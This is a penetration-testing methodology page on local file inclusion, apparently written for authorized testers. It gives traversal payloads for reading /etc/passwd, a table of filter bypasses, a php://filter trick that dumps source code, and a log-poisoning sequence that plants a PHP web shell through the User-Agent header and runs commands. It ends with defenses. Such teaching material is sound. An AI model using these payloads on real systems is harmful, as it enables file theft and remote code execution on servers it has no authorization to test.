---
layout: page
title: "File Inclusion"
subtitle: "Local file inclusion, path traversal filter bypasses and escalation to code execution"
permalink: /methodology/web-app/file-inclusion/
---

File inclusion occurs when a parameter chooses a file that the application loads, such as a page, language or template, and the value is not validated. Local file inclusion (LFI) lets the tester read files on the server. Under some conditions, including log or session poisoning, it can also execute code. Most LFI appears in parameters such as `?language=`, and the functions behind it include PHP `include()` and `require()`, `file_get_contents()`, NodeJS `fs.readFile()` and Java `include`.

## Workflow

1. Find the parameter. Look for values that select a file, such as `index.php?language=en`. Fuzz for hidden parameters that no form links to, then fuzz the value with an LFI wordlist. Use the response size of a normal request as the filter:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://TARGET_IP:TARGET_PORT/index.php?FUZZ=value' -fs BASELINE_SIZE
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://TARGET_IP:TARGET_PORT/index.php?language=FUZZ' -fs BASELINE_SIZE
```

2. Test direct reads. Start with a readable file to confirm that the value reaches the include:

```text
/etc/passwd
../../../../etc/passwd
```

On older Windows systems, `C:\Windows\boot.ini` is the equivalent test.

3. Bypass filters. Each filter below was built against one specific mistake:

| Filter | Bypass | Example |
|---|---|---|
| Single pass removal of `../` | Nest the sequence so that removal leaves a valid one | `....//....//etc/passwd` |
| Blocks `.` or `/` characters | URL encode, or double encode | `%2e%2e%2f%2e%2e%2fetc%2fpasswd` |
| Must start with an allowed directory | Start with the directory, then traverse | `./languages/../../../../etc/passwd` |
| Appends an extension | Null byte on PHP before 5.5 | `/etc/passwd%00` |
| Prefix added to the value | Start with a slash so the prefix is separated | `/../../../etc/passwd` |
| Path length limit (old PHP) | Long path with repeated `./` after a non-existent directory | Path that exceeds 4096 characters |

Find the approved path by reading the URLs that the existing forms use.

4. Read source code with PHP filters. The `convert.base64-encode` filter returns the file as base64 instead of executing it, so the source is shown as text:

```text
php://filter/read=convert.base64-encode/resource=config
```

```text
http://TARGET_IP:TARGET_PORT/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

Decode the response:

```bash
echo 'BASE64_STRING' | base64 -d
```

Fuzz for PHP pages with every status code. A 301, 302 or 403 page can still be read through LFI.

5. Collect server facts. The web root, the log location and the configuration are needed for escalation:

```text
../../../../etc/apache2/apache2.conf
../../../../etc/apache2/envvars
```

In the Apache configuration, `DocumentRoot`, `ErrorLog` and `CustomLog` show the web root and the log paths. `envvars` defines variables such as `APACHE_LOG_DIR`.

6. Escalate to code execution, only where the scope allows it.

Log poisoning writes PHP into a value that the server logs, such as the User-Agent header, and then includes the log:

```bash
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://TARGET_IP:TARGET_PORT/index.php" -H @Poison
```

```text
http://TARGET_IP:TARGET_PORT/index.php?language=/var/log/apache2/access.log&cmd=id
```

Session poisoning works the same way. Set a parameter that is stored in the session, then include the session file named after the `PHPSESSID` cookie, which is stored under `/var/lib/php/sessions/`.

Other readable files that may contain attacker input include `/proc/self/environ`, mail logs and SSH or FTP logs.

## What to look for

- Included content echoed in the response, or base64 text that decodes to source.
- Error messages that reveal paths or the include function.
- Readable logs, such as Nginx access logs that are readable by low-privileged users by default.
- Parameters that look like page selectors, including ones found only by fuzzing.

## Pitfalls

- Filter behaviour depends on the PHP version. Test the older bypasses only when the version is known to be old.
- A poisoned session is overwritten on the next request. Poison it again before each include.
- Apache logs are often readable only by privileged users, so a log include may fail even when the poisoning works.
- Restrict testing to read-only file access unless execution is in scope.

> Defense: map a fixed set of page names to file paths on the server, and never pass raw input into an include path. Restrict the readable directories with `open_basedir`, and run the web server with low privileges. See [Prevention and remediation](/methodology/web-app/prevention/).
{: .info }
